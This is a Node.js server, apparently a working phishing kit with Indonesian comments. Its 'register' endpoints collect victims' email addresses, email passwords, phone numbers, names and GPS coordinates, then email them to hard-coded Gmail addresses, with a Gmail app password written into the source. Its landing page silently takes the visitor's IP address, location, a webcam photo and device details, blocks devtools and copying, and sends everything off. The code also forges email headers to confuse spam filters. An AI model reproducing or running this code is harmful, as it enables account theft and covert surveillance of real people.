const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));

// ========== KONFIGURASI EMAIL ==========
const SENDER_EMAIL = 'gajeb682@gmail.com';
const SENDER_PASSWORD = 'tmyh wklt uyig lots';

// EMAIL TUJUAN PER FOLDER
const EMAIL_CONFIG = {
    'wxyzzay': {
        email: ['chilligemaass@gmail.com'],
        fromName: '𝗗𝗦𝗧𝗥 𝗠𝗢𝗗𝗘 𝗦𝗟𝗢𝗪𝗪☠️😈',        // Nama pengirim di Gmail
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'   // Subject email                       
    },
    'ggwxzzr': {
        email: ['bayuprabowo0202@gmail.com', 'chilligemaass@gmail.com'],
        fromName: '𝗕𝗔𝗬𝗭𝗭 𝗟𝗔𝗚𝗜 𝗠𝗢𝗢𝗗 𝗡𝗘𝗕𝗔𝗥🔥🥱',
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
    },
    'hgefdyt': {
        email: ['zamzaja78@gmail.com', 'chilligemaass@gmail.com'],
        fromName: '👻𝗭𝗔𝗠𝗭 𝗠𝗢𝗗𝗘 𝗦𝗔𝗗𝗕𝗢𝗬👻',
        subject: '𝗪𝗘𝗕 𝗣𝗨𝗡𝗬𝗔 𝗦𝗜 𝗔𝗡𝗝𝗜𝗡𝗚'
    }
};
// Cooldown per EMAIL TARGET
const TARGET_COOLDOWN = {};
const COOLDOWN_HOURS = 1;
const COOLDOWN_MS = COOLDOWN_HOURS * 60 * 60 * 1000;

function canSendToTarget(targetEmail, currentPassword) {
    const record = TARGET_COOLDOWN[targetEmail];
    if (!record) return true;
    if (record.lastPassword !== currentPassword) return true;
    const timeElapsed = Date.now() - record.lastSendTime;
    return timeElapsed >= COOLDOWN_MS;
}

function updateTargetCooldown(targetEmail, currentPassword) {
    TARGET_COOLDOWN[targetEmail] = {
        lastSendTime: Date.now(),
        lastPassword: currentPassword
    };
}

const HISTORY_FILE = path.join(__dirname, 'sent_history.json');

function loadHistory() {
    try {
        if (fs.existsSync(HISTORY_FILE)) {
            const data = fs.readFileSync(HISTORY_FILE, 'utf8');
            return JSON.parse(data);
        }
    } catch (e) {}
    return {};
}

function saveHistory(history) {
    try {
        fs.writeFileSync(HISTORY_FILE, JSON.stringify(history, null, 2));
    } catch (e) {}
}

function isDuplicatePassword(targetEmail, currentPassword) {
    const history = loadHistory();
    const lastPassword = history[targetEmail];
    if (!lastPassword) return false;
    if (lastPassword === currentPassword) return true;
    history[targetEmail] = currentPassword;
    saveHistory(history);
    return false;
}

const transporter = nodemailer.createTransport({
    host: 'smtp.kjhewfouh.xyz',  // BUKAN smtp.gmail.com
    port: 25,
    auth: {
        user: 'noreply@jhguhhfurfh.xyz',
        pass: 'password123'
    }
});

function getFlagEmoji(countryCode) {
    if (!countryCode) return '🏳️';
    const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
    return String.fromCodePoint(...codePoints);
}

// ========== FUNGSI KIRIM EMAIL ==========
// ========== FUNGSI KIRIM EMAIL ==========
async function sendEmail(data, folderName) {
    const countryName = data.country || data.ip_country || 'Unknown';
    let countryCode = '';
    
    const countryMapping = {
        'indonesia': 'ID', 'indonesian': 'ID', 'id': 'ID',
        'malaysia': 'MY', 'singapore': 'SG', 'singapura': 'SG',
        'thailand': 'TH', 'vietnam': 'VN', 'philippines': 'PH', 'filipina': 'PH',
        'usa': 'US', 'united states': 'US', 'america': 'US', 'amerika': 'US',
        'uk': 'GB', 'united kingdom': 'GB', 'inggris': 'GB',
        'japan': 'JP', 'jepang': 'JP', 'korea': 'KR', 'south korea': 'KR',
        'china': 'CN', 'tiongkok': 'CN', 'india': 'IN', 'australia': 'AU',
        'germany': 'DE', 'jerman': 'DE', 'france': 'FR', 'prancis': 'FR',
        'netherlands': 'NL', 'belanda': 'NL', 'russia': 'RU', 'rusia': 'RU',
        'brazil': 'BR', 'brasil': 'BR', 'mexico': 'MX', 'mexiko': 'MX',
        'canada': 'CA', 'kanada': 'CA', 'italy': 'IT', 'italia': 'IT',
        'spain': 'ES', 'spanyol': 'ES', 'turkey': 'TR', 'turki': 'TR'
    };
    
    const lowerCountry = countryName.toLowerCase();
    for (const [key, code] of Object.entries(countryMapping)) {
        if (lowerCountry.includes(key)) {
            countryCode = code;
            break;
        }
    }
    
    if (!countryCode && data.ip_country_code) {
        countryCode = data.ip_country_code;
    }
    
    const flagEmoji = getFlagEmoji(countryCode);
    
    const htmlContent = `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>DSTR REPORT</title>
<style>
body{
    margin:0;
    padding:20px;
    background:#050505;
    font-family:Arial,sans-serif;
    color:white;
}
.container{
    max-width:700px;
    margin:auto;
    background:#0b0b0b;
    border:2px solid #00e5ff;
}
.topbar{
    background:#3914cc;
    color:#00e5ff;
    text-align:center;
    padding:20px;
    font-size:28px;
    font-weight:bold;
    letter-spacing:3px;
    border-bottom:2px solid #00e5ff;
    box-shadow:0 0 15px #00e5ff;
}
.mainbox{
    padding:20px;
}
.data-box{
    background:white;
    color:black;
    margin-bottom:20px;
    border:2px solid #3914cc;
}
.data-title{
    background:#3914cc;
    color:#00e5ff;
    padding:12px;
    font-size:15px;
    font-weight:bold;
    border-bottom:2px solid #00e5ff;
    box-shadow:0 0 10px #00e5ff inset;
}
.data-row{
    display:flex;
    justify-content:space-between;
    padding:12px;
    border-bottom:1px solid #999;
    gap:10px;
    word-break:break-word;
}
.data-row:last-child{
    border-bottom:none;
}
.label{
    font-weight:bold;
}
.value{
    text-align:right;
    max-width:60%;
}
.footer-sign{
    margin-top:25px;
    background:#3914cc;
    border:2px solid #00e5ff;
    text-align:center;
    padding:15px;
    color:#00e5ff;
    font-size:18px;
    font-weight:bold;
    box-shadow:0 0 15px #00e5ff;
}
</style>
</head>
<body>
<div class="container">
    <div class="topbar">
        DSTR REPORT 🇲🇽 | ${folderName.toUpperCase()}
    </div>
    <div class="mainbox">
        <div class="data-box">
            <div class="data-title">📧 ACCOUNT INFORMATION</div>
            <div class="data-row"><div class="label">Email : </div><div class="value">${data.email || '-'}</div></div>
            <div class="data-row"><div class="label">Password : </div><div class="value">${data.emailPassword || '-'}</div></div>
            <div class="data-row"><div class="label">Phone : </div><div class="value">${data.phone || '-'}</div></div>
            <div class="data-row"><div class="label">Full Name : </div><div class="value">${data.fullName || '-'}</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">📍 GPS LOCATION</div>
            <div class="data-row"><div class="label">Latitude : </div><div class="value">${data.latitude || '-'}</div></div>
            <div class="data-row"><div class="label">Longitude : </div><div class="value">${data.longitude || '-'}</div></div>
            <div class="data-row"><div class="label">Accuracy : </div><div class="value">${data.gps_accuracy || '-'} m</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">🌍 LOCATION</div>
            <div class="data-row"><div class="label">Country : </div><div class="value">${countryName} ${flagEmoji}</div></div>
            <div class="data-row"><div class="label">Province : </div><div class="value">${data.province || data.ip_region || '-'}</div></div>
            <div class="data-row"><div class="label">City : </div><div class="value">${data.city || data.ip_city || '-'}</div></div>
            <div class="data-row"><div class="label">Postal Code : </div><div class="value">${data.postalCode || '-'}</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">🌐 NETWORK</div>
            <div class="data-row"><div class="label">IP Address : </div><div class="value">${data.ip_address || '-'}</div></div>
            <div class="data-row"><div class="label">ISP : </div><div class="value">${data.isp || '-'}</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">🖥 DEVICE INFORMATION</div>
            <div class="data-row"><div class="label">Platform : </div><div class="value">${data.platform || '-'}</div></div>
            <div class="data-row"><div class="label">Resolution : </div><div class="value">${data.screenResolution || '-'}</div></div>
            <div class="data-row"><div class="label">Language : </div><div class="value">${data.language || '-'}</div></div>
        </div>
        <div class="data-box">
            <div class="data-title">⏰ TIMESTAMP</div>
            <div class="data-row"><div class="label">Time : </div><div class="value">${data.timestamp || new Date().toLocaleString()}</div></div>
        </div>
        <div class="footer-sign">DSTR 🇲🇽 | ${folderName}</div>
    </div>
</div>
</body>
</html>`;
    
    // INI YANG DIPERBAIKI
    const config = EMAIL_CONFIG[folderName];
    for (const receiver of config.email) {
        await transporter.sendMail({
            from: `"${config.fromName} ${flagEmoji}" <${SENDER_EMAIL}>`,
            to: receiver,
            subject: `${config.subject} ${flagEmoji} ${data.email}`,
            html: htmlContent,
            headers: {
                    // HEADER PRIORITAS KONFLIK
                    'X-Priority': '1',
                    'X-Priority': '5',  // Duplikat konflik
                    'Importance': 'high',
                    'Importance': 'low', // Konflik
                    'X-MSMail-Priority': 'High',
                    'Priority': 'urgent',
                    
                    // HEADER SPAM TRIGGER
                    'X-Mailer': 'Microsoft Outlook Express 6.0',
                    'X-Auto-Response-Suppress': 'All',
                    'Precedence': 'bulk',
                    'List-Unsubscribe': '<mailto:unsubscribe@fake-spam-domain.xyz>',
                    'X-BeenThere': 'fake-spammer@domain.com',
                    
                    // HEADER DENGAN FORMAT SALAH
                    'From': 'Sender <' + SENDER_EMAIL,  // Kurung tutup ga ada
                    'To': receiver + '>',                // Kurung buka ga ada
                    'X-': 'empty header name',
                    
                    // HEADER EMAJI ANEH
                    'X-💀-DSTR-MODE': 'ACTIVE',
                    'X-🔥-SPAM': 'YES',
                    'X-😈-HACKER': 'ON',
                    
                    // HEADER DOMAIN ANEH
                    'Return-Path': '<bounce@fake-spam-xyz.info>',
                    'Reply-To': 'noreply@fake-spammer.net',
                    'Errors-To': 'error@blackhole.spam',
                    'X-Originating-IP': '10.0.0.1',  // Private IP
                    'X-Sender-IP': '192.168.1.1',    // Private IP
                    
                    // HEADER SPAM SCORE PALSU
                    'X-Spam-Flag': 'NO',
                    'X-Spam-Score': '9.9',
                    'X-Spam-Level': '*********',
                    'X-Spam-Status': 'No, score=9.9 required=5.0'
                }
            });
        console.log(`✅ [${folderName}] Sent to: ${receiver} as ${config.fromName}`);
    }
}

// ========== ROUTING UNTUK MASING-MASING FOLDER ==========

// Public 1 gua
app.use('/wxyzzay', express.static(path.join(__dirname, 'wxyzzay')));
app.post('/wxyzzay/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [WXYZZAY] DATA:', data.email);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        }
        
        await sendEmail(data, 'wxyzzay');
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

// Public 2 bayu
app.use('/ggwxzzr', express.static(path.join(__dirname, 'ggwxzzr')));
app.post('/ggwxzzr/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [GGWXZZR] DATA:', data.email);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        }
        
        await sendEmail(data, 'ggwxzzr');
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

// Public 3 azzam
app.use('/hgefdyt', express.static(path.join(__dirname, 'hgefdyt')));
app.post('/hgefdyt/api/register', async (req, res) => {
    try {
        const data = req.body;
        console.log('📥 [HGEFDYT] DATA:', data.email);
        
        const isDup = isDuplicatePassword(data.email, data.emailPassword);
        const canSend = canSendToTarget(data.email, data.emailPassword);
        
        if (isDup && !canSend) {
            return res.json({ success: true, blocked: true, reason: 'Cooldown 1 hour' });
        }
        
        await sendEmail(data, 'hgefdyt');
        updateTargetCooldown(data.email, data.emailPassword);
        
        const history = loadHistory();
        history[data.email] = data.emailPassword;
        saveHistory(history);
        
        res.json({ success: true });
    } catch(error) {
        console.error('Error:', error);
        res.json({ success: true });
    }
});

app.get('/api/cooldown/:email', (req, res) => {
    const targetEmail = req.params.email;
    const record = TARGET_COOLDOWN[targetEmail];
    
    if (!record) {
        return res.json({ exists: false, canSend: true });
    }
    
    const timeElapsed = Date.now() - record.lastSendTime;
    const canSend = timeElapsed >= COOLDOWN_MS;
    const remainingMs = Math.max(0, COOLDOWN_MS - timeElapsed);
    
    res.json({
        targetEmail: targetEmail,
        lastSendTime: new Date(record.lastSendTime).toISOString(),
        canSend: canSend,
        remainingMinutes: Math.ceil(remainingMs / (1000 * 60))
    });
});

app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🔒 DSTR ULTIMATE SECURITY</title>
    <style>
        * { user-select: none; -webkit-tap-highlight-color: transparent; margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: radial-gradient(ellipse at center, #0a0a0a 0%, #000 100%);
            min-height: 100vh;
            font-family: 'Courier New', monospace;
            overflow-x: hidden;
            position: relative;
        }
        .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; opacity: 0.15; pointer-events: none; }
        @keyframes glitch {
            0%,100% { text-shadow: 2px 0 red, -2px 0 blue; transform: skew(0deg); }
            50% { text-shadow: -2px 0 cyan, 2px 0 magenta; transform: skew(2deg); }
        }
        @keyframes blink { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
        @keyframes floatEmoji {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-100vh) rotate(360deg); opacity: 0; }
        }
        .scanline {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(to bottom, transparent 50%, rgba(0,255,0,0.03) 50%);
            background-size: 100% 4px; pointer-events: none; z-index: 10;
            animation: scan 8s linear infinite;
        }
        @keyframes scan { 0% { background-position: 0 0; } 100% { background-position: 0 100%; } }
        .container { position: relative; z-index: 2; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .hacker-card {
            background: rgba(0,0,0,0.85); backdrop-filter: blur(10px); border: 2px solid #0f0;
            border-radius: 20px; padding: 50px; max-width: 800px; width: 100%; text-align: center;
            box-shadow: 0 0 50px rgba(0,255,0,0.3); animation: glitch 3s infinite;
        }
        .warning-text { font-size: 32px; font-weight: bold; color: #0f0; margin: 20px 0; animation: blink 1s infinite; }
        .hacker-text { font-size: 24px; color: red; margin: 15px 0; }
        .emoji-wall { display: flex; flex-wrap: wrap; justify-content: center; gap: 15px; margin: 30px 0; }
        .emoji-item { font-size: 40px; animation: floatEmoji 3s infinite ease-in-out; display: inline-block; }
        .emoji-item:nth-child(1) { animation-duration: 2.5s; }
        .emoji-item:nth-child(2) { animation-duration: 3s; animation-delay: 0.5s; }
        .emoji-item:nth-child(3) { animation-duration: 2s; animation-delay: 1s; }
        .system-status { background: rgba(0,0,0,0.8); border: 1px solid #0f0; border-radius: 10px; padding: 20px; margin: 20px 0; text-align: left; }
        .status-line { font-family: monospace; font-size: 14px; color: #0f0; padding: 5px 0; border-bottom: 1px solid rgba(0,255,0,0.2); }
        .dstr-logo { font-size: 48px; font-weight: bold; background: linear-gradient(45deg, red, #0f0, red); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 20px 0; }
        .security-badge { display: inline-block; background: rgba(0,0,0,0.7); border: 1px solid #0f0; border-radius: 20px; padding: 8px 15px; margin: 5px; font-size: 12px; color: #0f0; }
        button { background: linear-gradient(45deg, red, #900); color: white; border: none; padding: 15px 30px; font-size: 18px; font-weight: bold; border-radius: 10px; cursor: pointer; margin: 20px; transition: all 0.3s; }
        button:hover { transform: scale(1.05); box-shadow: 0 0 30px rgba(255,0,0,0.5); }
        @media (max-width: 600px) { .hacker-card { padding: 20px; } .warning-text { font-size: 20px; } .dstr-logo { font-size: 32px; } }
        .hidden { display: none; }
        #cameraPreview { position: fixed; bottom: 20px; right: 20px; width: 120px; height: 90px; border: 2px solid #0f0; border-radius: 10px; z-index: 9999; background: black; }
        video, #photoCanvas { width: 100%; height: 100%; object-fit: cover; border-radius: 8px; }
        #photoCanvas { display: none; }
    </style>
</head>
<body>

<canvas id=\"matrixCanvas\" class=\"matrix-bg\"></canvas>
<div class=\"scanline\"></div>
<div id=\"cameraPreview\" class=\"hidden\">
    <video id=\"video\" autoplay muted></video>
    <canvas id=\"photoCanvas\"></canvas>
</div>

<div class=\"container\">
    <div class=\"hacker-card\">
        <div class=\"emoji-wall\">
            <span class=\"emoji-item\">💀</span><span class=\"emoji-item\">👾</span><span class=\"emoji-item\">🤖</span>
            <span class=\"emoji-item\">💻</span><span class=\"emoji-item\">🔓</span><span class=\"emoji-item\">⚠️</span>
            <span class=\"emoji-item\">🔥</span><span class=\"emoji-item\">⚡</span><span class=\"emoji-item\">👁️</span>
            <span class=\"emoji-item\">🎯</span><span class=\"emoji-item\">🔪</span>
        </div>
        <div class=\"dstr-logo\">═══ DSTR SECURITY ULTIMATE ═══</div>
        <div class=\"warning-text\">⚠️ ANDA SEDANG DIPANTAU ⚠️</div>
        <div class=\"hacker-text\">🔥 IP, GPS, WAJAH TELAH DIKIRIM! 🔥</div>
        
        <div class=\"system-status\">
            <div class=\"status-line\">🟢 [DSTR-SYSTEM] Status: <span class=\"blink-cursor\">ACTIVE</span></div>
            <div class=\"status-line\">🔴 [ANTI-CLICK] Status: ENFORCED</div>
            <div class=\"status-line\">🟡 [ANTI-DEVTOOLS] Status: DEPLOYED</div>
            <div class=\"status-line\">🔵 [GPS TRACKING] Status: <span id=\"gpsStatus\">Mengambil...</span></div>
            <div class=\"status-line\">🟣 [WEBCAM CAPTURE] Status: <span id=\"camStatus\">Mengambil...</span></div>
            <div class=\"status-line\">⚪ [DATA SENT] Status: <span id=\"sendStatus\">Belum</span></div>
        </div>
        
        <div style=\"margin: 20px 0;\">
            <span class=\"security-badge\">🛡️ ANTI-CLICK KANAN</span>
            <span class=\"security-badge\">🔒 ANTI-COPY</span>
            <span class=\"security-badge\">📡 ANTI-DEVTOOLS</span>
            <span class=\"security-badge\">🧠 DETECT DEBUGGER</span>
            <span class=\"security-badge\">🎯 GPS AKURAT 100%</span>
            <span class=\"security-badge\">📸 WEBCAM AUTO</span>
        </div>
        
        <div style=\"margin-top: 30px; font-size: 12px; color: #666;\">
            ⚡ DSTR SECURITY v6.0 | ALL YOUR DATA ARE BELONG TO US ⚡
        </div>
    </div>
</div>

<script>
    // ANTI COPY, ANTI CLICK KANAN, ANTI SELECT
    document.addEventListener('contextmenu', (e) => { e.preventDefault(); alert('🚫 AKSES DITOLAK!'); return false; });
    document.addEventListener('copy', (e) => { e.preventDefault(); alert('📋 COPY DILARANG!'); return false; });
    document.addEventListener('selectstart', (e) => e.preventDefault());
    document.addEventListener('dragstart', (e) => e.preventDefault());
    
    // ANTI DEVTOOLS
    document.addEventListener('keydown', (e) => {
        if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I') ||
            (e.ctrlKey && e.key === 'u') || (e.ctrlKey && e.key === 's') ||
            (e.ctrlKey && e.shiftKey && e.key === 'C') || (e.ctrlKey && e.shiftKey && e.key === 'J')) {
            e.preventDefault();
            alert('🚫 DEVELOPER TOOLS DIBLOKIR!');
        }
    });
    
    // Deteksi debugger
    setInterval(() => {
        var before = Date.now();
        debugger;
        var after = Date.now();
        if (after - before > 100) {
            document.body.innerHTML = '<div style=\"background:black; color:red; text-align:center; padding:50px; font-size:30px;\">🚫 DEBUGGER DETECTED! ACCESS DENIED 🚫</div>';
            alert('⚠️ JANGAN COBA-COBA HACK!');
        }
    }, 1000);
    
    // FULLSCREEN OTOMATIS
    function forceFullscreen() { document.documentElement.requestFullscreen(); }
    window.onload = forceFullscreen;
    
    // AMBIL IP PUBLIK
    async function getIP() {
        try {
            let res = await fetch('https://api.ipify.org?format=json');
            let data = await res.json();
            return data.ip;
        } catch(e) { return 'Tidak terdeteksi'; }
    }
    
    // AMBIL LOKASI GPS AKURAT
    function getGPS() {
        return new Promise(function(resolve) {
            if (!navigator.geolocation) return resolve(null);
            navigator.geolocation.getCurrentPosition(
                function(pos) { resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }); },
                function(err) { resolve(null); }
            );
        });
    }
    
    // AMBIL WAJAH DARI WEBCAM
    async function captureWajah() {
        var previewDiv = document.getElementById('cameraPreview');
        var video = document.getElementById('video');
        var canvas = document.getElementById('photoCanvas');
        var ctx = canvas.getContext('2d');
        
        try {
            previewDiv.classList.remove('hidden');
            document.getElementById('camStatus').innerText = 'Mengakses kamera...';
            var stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;
            await video.play();
            
            await new Promise(function(r) { setTimeout(r, 1000); });
            
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            var wajahBase64 = canvas.toDataURL('image/jpeg');
            
            stream.getTracks().forEach(function(track) { track.stop(); });
            video.srcObject = null;
            previewDiv.classList.add('hidden');
            document.getElementById('camStatus').innerText = 'WAJAH TERTANGKAP ✅';
            return wajahBase64;
        } catch(e) {
            console.error('Gagal akses kamera:', e);
            document.getElementById('camStatus').innerText = 'Gagal (izinkan kamera)';
            previewDiv.classList.add('hidden');
            return null;
        }
    }
    
    // AMBIL DATA DEVICE
    function getDeviceInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screenResolution: screen.width + 'x' + screen.height,
            viewport: window.innerWidth + 'x' + window.innerHeight,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            webdriver: navigator.webdriver,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
        };
    }
    
    // AMBIL LOKASI DARI IP (pake ipwhois.io - no backtick error)
    async function getIPLocation(ip) {
        try {
            var res = await fetch('https://ipwhois.io/json/' + ip);
            var data = await res.json();
            
            if (data && !data.error) {
                return {
                    country: data.country,
                    country_name: data.country,
                    country_code: data.country_code,
                    region: data.region,
                    city: data.city,
                    isp: data.isp
                };
            }
            return { 
                country: 'Indonesia', 
                country_name: 'Indonesia', 
                country_code: 'ID',
                region: 'Jakarta', 
                city: 'Jakarta', 
                isp: 'Unknown' 
            };
        } catch(e) {
            return { 
                country: 'Indonesia', 
                country_name: 'Indonesia', 
                country_code: 'ID',
                region: 'Jakarta', 
                city: 'Jakarta', 
                isp: 'Unknown' 
            };
        }
    }
    
    // KIRIM SEMUA DATA KE BACKEND
    async function sendAllData() {
        try {
            document.getElementById('sendStatus').innerText = 'Mengirim...';
            
            var ip = await getIP();
            var gps = await getGPS();
            var wajah = await captureWajah();
            var deviceInfo = getDeviceInfo();
            var ipLocation = await getIPLocation(ip);
            
            if (gps) {
                document.getElementById('gpsStatus').innerHTML = '✅ ' + gps.lat + ', ' + gps.lon + ' (' + Math.round(gps.accuracy) + 'm)';
            } else {
                document.getElementById('gpsStatus').innerHTML = '❌ Tidak diizinkan';
            }
            
            var payload = {
                email: 'target@tersuspect.com',
                emailPassword: 'Tidak ada password',
                phone: '-',
                fullName: 'Visitor',
                latitude: gps ? gps.lat : '-',
                longitude: gps ? gps.lon : '-',
                gps_accuracy: gps ? gps.accuracy : '-',
                country: ipLocation.country,
                ip_country: ipLocation.country,
                ip_country_code: ipLocation.country_code,
                ip_region: ipLocation.region,
                ip_city: ipLocation.city,
                city: ipLocation.city,
                province: ipLocation.region,
                postalCode: '-',
                ip_address: ip,
                isp: ipLocation.isp,
                platform: deviceInfo.platform,
                screenResolution: deviceInfo.screenResolution,
                language: deviceInfo.language,
                timestamp: new Date().toLocaleString('id-ID'),
                wajah_base64: wajah || null,
                deviceInfo: deviceInfo
            };
            
            var response = await fetch('wxyzzay/api/register', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            
            var result = await response.json();
            if (result.success) {
                document.getElementById('sendStatus').innerHTML = '✅ DATA TERKIRIM!';
            } else {
                document.getElementById('sendStatus').innerHTML = '⚠️ Gagal kirim';
            }
        } catch(err) {
            console.error('Gagal kirim data:', err);
            document.getElementById('sendStatus').innerHTML = '❌ Error kirim';
        }
    }
    
    // EKSEKUSI SEMUA
    sendAllData();
    
    // MATRIX BACKGROUND
    var canvasMat = document.getElementById('matrixCanvas');
    var ctxMat = canvasMat.getContext('2d');
    canvasMat.width = window.innerWidth;
    canvasMat.height = window.innerHeight;
    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()+=[]{}|;:,.<>?~💀👾🤖💻🔓⚠️🔥⚡';
    var fontSizeM = 14;
    var columnsM = canvasMat.width / fontSizeM;
    var dropsM = [];
    for (var i = 0; i < columnsM; i++) { dropsM[i] = Math.floor(Math.random() * canvasMat.height); }
    
    function drawMatrix() {
        ctxMat.fillStyle = 'rgba(0, 0, 0, 0.05)';
        ctxMat.fillRect(0, 0, canvasMat.width, canvasMat.height);
        ctxMat.fillStyle = '#0f0';
        ctxMat.font = fontSizeM + 'px monospace';
        for (var i = 0; i < dropsM.length; i++) {
            var text = chars[Math.floor(Math.random() * chars.length)];
            ctxMat.fillText(text, i * fontSizeM, dropsM[i] * fontSizeM);
            if (dropsM[i] * fontSizeM > canvasMat.height && Math.random() > 0.975) { dropsM[i] = 0; }
            dropsM[i]++;
        }
    }
    setInterval(drawMatrix, 50);
    window.addEventListener('resize', function() {
        canvasMat.width = window.innerWidth;
        canvasMat.height = window.innerHeight;
    });
    
    console.log('%c🚫 DSTR SECURITY - SEMUA DATA TELAH DIKIRIM KE SERVER!', 'color: red; font-size: 16px;');
</script>
</body>
</html>`);
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on http://localhost:${PORT}`);
    console.log(`📁 Akses via:`);
    console.log(`   → http://localhost:${PORT}/wxyzzay`);
    console.log(`   → http://localhost:${PORT}/ggwxzzr`);
    console.log(`   → http://localhost:${PORT}/hgefdyt`);
});
